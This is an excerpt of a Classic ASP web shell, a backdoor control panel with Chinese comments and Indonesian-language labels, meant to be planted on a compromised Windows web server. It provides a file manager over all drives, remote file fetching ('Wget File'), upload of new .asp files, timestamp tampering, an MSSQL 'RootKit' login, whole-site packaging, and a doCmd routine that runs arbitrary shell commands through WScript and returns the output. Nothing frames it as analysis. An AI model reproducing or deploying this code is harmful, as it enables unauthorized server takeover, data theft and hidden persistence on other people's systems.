...
<a href="?action=logOut">LOG OUT</a> | <a href="javascript:menuGo('fileManager')">FileManager</a> | <a href="javascript:menuGo('systemInfo')">System Info</a> | <a href="javascript:menuGo('doCmd')">Cmd</a> | <a href="javascript:menuGo('database')">Database Operations</a> | <a href="javascript:menuGo('pack')">Entire Site Package</a> | <a href="javascript:menuGo('searchFile')">Find Files</a> | <a href="javascript:menuGo('Rootkit')">MSSQLRootKit</a> |
</td>
</tr>
</table>
...
class Rootkit
	...
	public sub rootkitLogin()
		...
		www output,"&nbsp;&nbsp;&nbsp;密码："
		www output,"<input name=""rtpassword"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""20"" value="""&sessionpassword")&"""  /><br>"
		www output,"&nbsp;&nbsp;&nbsp;库名："
	...
	private sub getHard '得到盘符
		...
		www output,"<tr class=""alt1""><td colspan=""7"" style=""padding:5px;"">"
		www output,"<a  href=""javascript:var path=window.prompt('新建文件夹路径','"&format(currentPath)&"\\"&"newFolder');if (path){ inputBox(path,'createFolder');}"">Gawe Folder</a> | "
		www output,"<a  href=""javascript:var path=window.prompt('新建文件路径','"&format(currentPath)&"\\"&"newfile.asp');if (path){ inputBox(path,'createFile');}"">Gawe File</a> | "
		www output,"<br>"
...
class fileManager
	...
	private sub getHard '得到盘符
		...
		www output,"<a  href=""javascript:inputBox('','xmlDown')"">Wget File</a> | "
		www output,"<a  href=""javascript:inputBox('','upFile')"">Ngupload File</a> | "
		www output,"<br>"
		www output,"<a  href=""javascript:js_showFolder('"&format(wwwPath)&"')"">Direktori WEB</a> | "
		www output,"<a  href=""javascript:js_showFolder('"&format(myPath)&"')"">MY PATH</a> | "
		set dc=fso.Drives
		For Each d In dc
			if d.DriveType=2 then
				www output,"<a  href=""javascript: js_showFolder('"&format(d.driveletter)&":\\"&"')"">DISK("&d.driveletter&")</a> | "
			end if
		Next
		For Each d In dc
			if d.DriveType=2 then
	...
	public sub showFile(path) '得到文件
		...
		www output,"<tr><td valign=""top""  width=""20%"">"
		www output,"<table style=""width:100%;border-collapse:collapse;"">"
		www output,"<tr class=""head""><td width=""100%""><a href=""javascript:hideObj(document.getElementById('folderList'));""><b>Folder List</b></a></td></tr>"
		www output,"</table>"
	    on error resume next
		...
		www output,"<tr class=""alt1"">"
		www output,"<td style=""width:2%;""></td><td><a href=""javascript: js_showFolder('"&format(getParentPath(currentPath))&"')"">Current Path</a></td><td></td><td></td></tr>"
		...
		if pathFolder<>"" then
			...
			for each fd in folders
				...
				www output,"<tr class=""alt"&thisColor&""" onmouseover=""this.className='focus';"" onmouseout=""this.className='alt"&thisColor&"';"">"
				www output,"<td style=""width:2%;""></td>"
				www output,"<td><a href=""javascript: js_showFolder('"&format(fd.path)&"')"" ><b>"&fd.name&"</b></a></td><td> <a href=""javascript:if (askOK()){ inputBox('"&format(fd.path)&"','deleteFolder');}"">Apusen Folder</a></td> <td><a href=""javascript:var path2=window.prompt('重命名后的文件夹路径','"&format(currentPath)&"\\"&"newFolder');if (path2){ inputBox2('"&format(fd.path)&"','renameFolder',path2);}"">重</a></td>"&""
				www output,"</tr>"
			...
			for each f in files
				...
				www output,"<tr class=""alt"&thisColor&""" onmouseover=""this.className='focus';"" onmouseout=""this.className='alt"&thisColor&"';"">"
				www output,"<td style=""width:2%;""><input  type=""checkbox"" value="""&format(f.path)&""" name=""fileOption""></td><td><a href="""&goUrl&""" target=""_blank"">"&f.name&"</a></td><td>"&f.DateLastModified&"</td><td>"&f.size&"</td><td><a href=""javascript:inputBox('"&format(f.path)&"','downFile');"">Download</a> | <a href=""javascript:var path2=window.prompt('复制后的文件路径','"&format(currentPath)&"\\"&"newFile.asp');if (path2){ inputBox2('"&format(f.path)&"','copyFile',path2);}"">Copy</a> | <a href=""javascript:inputBox('"&format(f.path)&"','editFile');"">Edit</a> | <a href=""javascript:var path2=window.prompt('重命名后的文件路径','"&format(currentPath)&"\\"&"newFile.asp');if (path2){ inputBox2('"&format(f.path)&"','renameFile',path2);}"">Rename</a> | <a href=""javascript:inputBox('"&format(f.path)&"','setTime')"">Modifikasi</a></td></tr>"
	...
	private sub upFile()
		...
		www output,"<input name=""savePath"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""100"" value="""&currentPath&"\diy3.asp"" /></p>"
...
sub doCmd()
	...
	if myRequest("act2")="save" then
		...
		if isWScript<>"" then
			...
			set re=shell.exec(cmdPath&" "&cmd)
			Response.Write(cmdPath&" "&cmd)
			result=re.stdout.readAll
			set re=nothing
			set shell=nothing
		else
			resultTempFile=server.MapPath("3xFishhead.txt")
			ws.run cmdPath&" "&cmd&" >"&resultTempFile,0,true
			set fso=server.CreateObject("scripting.filesystemobject")
